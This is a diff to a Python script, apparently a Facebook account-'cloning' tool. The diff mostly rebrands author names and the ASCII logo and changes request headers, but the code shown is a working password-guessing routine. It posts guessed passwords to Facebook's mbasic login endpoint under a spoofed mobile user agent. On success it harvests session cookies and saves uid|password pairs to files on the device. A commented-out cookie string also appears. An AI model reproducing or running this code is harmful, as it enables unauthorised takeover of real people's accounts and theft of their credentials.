@@ -1,7 +1,7 @@
-# Facebook: SHANTO MAFIA
-# Github: SHANTO-MAFIA
+# Facebook: Shanto King
+# Github: Shanto-King
 import os,sys,time,json,random,re,string,platform,base64,uuid
-os.system("xdg-open https://www.facebook.com/rjshanto723")
+os.system("git pull")
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
@@ -92,17 +92,18 @@ ha = current.day
 today = date.today()
 os.system('xdg-open https://facebook.com/groups/554714119911648/')
 logo =("""\033[0;92m
-     _______. __    __       ___      .__   __. .___________.  ______   
-    /       ||  |  |  |     /   \     |  \ |  | |           | /  __  \  
-   |   (----`|  |__|  |    /  ^  \    |   \|  | `---|  |----`|  |  |  | 
-    \   \    |   __   |   /  /_\  \   |  . `  |     |  |     |  |  |  | 
-.----)   |   |  |  |  |  /  _____  \  |  |\   |     |  |     |  `--'  | 
-|_______/    |__|  |__| /__/     \__\ |__| \__|     |__|      \______/  
+
+ _____ _   _   ___   _   _ _____ _____ 
+/  ___| | | | / _ \ | \ | |_   _|  _  |
+\ `--.| |_| |/ /_\ \|  \| | | | | | | |
+ `--. \  _  ||  _  || . ` | | | | | | |
+/\__/ / | | || | | || |\  | | | \ \_/ /
+\____/\_| |_/\_| |_/\_| \_/ \_/  \___/ 
 \033[0;94m╠═══════════════════════════════════════════════════║
-\033[0;93m╠══[Author:=======================> \33[1;38mMR. SHANTO\33[1;38m       ║\033[1;31m
-╠══[Facebook:=====================> SHANTO MAFIA      ║  \033[1;97m
-╠══[Github:=======================> \33[1;38mSHANTO-MAFIA      ║\33[1;34m
-╠══[Whatsapp:=====================> 01812631926     ║\33[1;35m
+\033[0;93m╠══[Author:=======================> \33[1;38mMR. Shanto\33[1;38m       ║\033[1;31m
+╠══[Facebook:=====================> Shanto King      ║  \033[1;97m
+╠══[Github:=======================> \33[1;38mShanto-King      ║\33[1;34m
+╠══[Whatsapp:=====================> 01812631***     ║\33[1;35m
 ╠══[TOOLS:========================> Random Cloning  ║ \33[1;32m
 ╠══[VERSION:======================> 0.1           ║\033[1;35m
 \033[0;92m╚═══════════════════════════════════════════════════╝\033[1;31m
@@ -229,42 +230,43 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            headers = {'authority': 'free.facebook.com',
-     'method': 'GET',
-    'scheme': 'https', 
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-    'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
-    'cache-control': 'max-age=0',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-}
+            header_freefb = {"authority": 'mbasic.facebook.com',
+            "method": 'GET',
+            "scheme": 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
             lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[SHANTO-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[Shanto-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
-                open('/sdcard/SHANTO-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/Shanto-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
                 #print('\r\r\33[1;30m[MKR-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/SHANTO-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/Shanto-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}SHANTO{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+        sys.stdout.write(f'\r\r%s{x}[{xr}Shanto{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
         sys.stdout.flush()
     except:
         pass
